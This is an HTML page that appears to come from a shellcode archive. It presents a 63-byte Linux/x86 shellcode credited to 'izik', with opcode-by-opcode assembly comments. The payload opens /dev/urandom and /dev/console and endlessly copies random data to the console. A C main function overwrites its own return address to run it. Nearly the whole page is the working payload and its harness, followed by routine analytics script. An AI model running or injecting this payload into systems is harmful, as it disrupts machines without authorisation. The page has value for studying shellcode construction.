<html><head><title>Linux/x86 - cat /dev/urandom &gt; /dev/console, no real profit just for kicks - 63 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
 * (linux/x86) cat /dev/urandom &gt; /dev/console, no real profit just for kicks - 63 bytes
 * - izik &lt;izik@tty64.org&gt;
 */

char shellcode[] = 

	&quot;\x31\xc9&quot;              // xor %ecx,%ecx 
	&quot;\x51&quot;                  // push %ecx 
	&quot;\x68\x6e\x64\x6f\x6d&quot;  // push $0x6d6f646e 
	&quot;\x68\x2f\x75\x72\x61&quot;  // push $0x6172752f 
	&quot;\x68\x2f\x64\x65\x76&quot;  // push $0x7665642f 
	&quot;\x89\xe3&quot;              // mov %esp,%ebx 
	&quot;\xb1\x02&quot;              // mov $0x2,%cl 

	//
	// &lt;_openit&gt;:
	//

	&quot;\x6a\x05&quot;              // push $0x5 
	&quot;\x58&quot;                  // pop %eax 
	&quot;\x99&quot;                  // cltd 
	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x96&quot;                  // xchg %eax,%esi 
	&quot;\x5f&quot;                  // pop %edi 
	&quot;\x5d&quot;                  // pop %ebp 
	&quot;\x5d&quot;                  // pop %ebp 
	&quot;\x68\x73\x6f\x6c\x65&quot;  // push $0x656c6f73 
	&quot;\x68\x2f\x63\x6f\x6e&quot;  // push $0x6e6f632f 
	&quot;\x57&quot;                  // push %edi 
	&quot;\xe2\xe9&quot;              // loop &lt;_openit&gt;
 
	&quot;\x89\xc3&quot;              // mov %eax,%ebx 

	//
	// &lt;_makeio&gt;:
	//

	&quot;\xb2\x04&quot;              // mov $0x4,%dl 
	&quot;\x89\xe1&quot;              // mov %esp,%ecx 

	//
	// &lt;_pre_ioloop&gt;:
	//

	&quot;\xb0\x03&quot;              // mov $0x3,%al 
	&quot;\xf8&quot;                  // clc 
	
	//
	// &lt;_ioloop&gt;:
	//

	&quot;\xcd\x80&quot;              // int $0x80 
	&quot;\x87\xde&quot;              // xchg %ebx,%esi 
	&quot;\x72\xf7&quot;              // jc &lt;_pre_ioloop&gt; 
	&quot;\xf9&quot;                  // stc 
	&quot;\xeb\xf7&quot;;             // jmp &lt;_ioloop&gt; 

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&amp;ret + 2;
	(*ret) = (int) shellcode;
}



<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
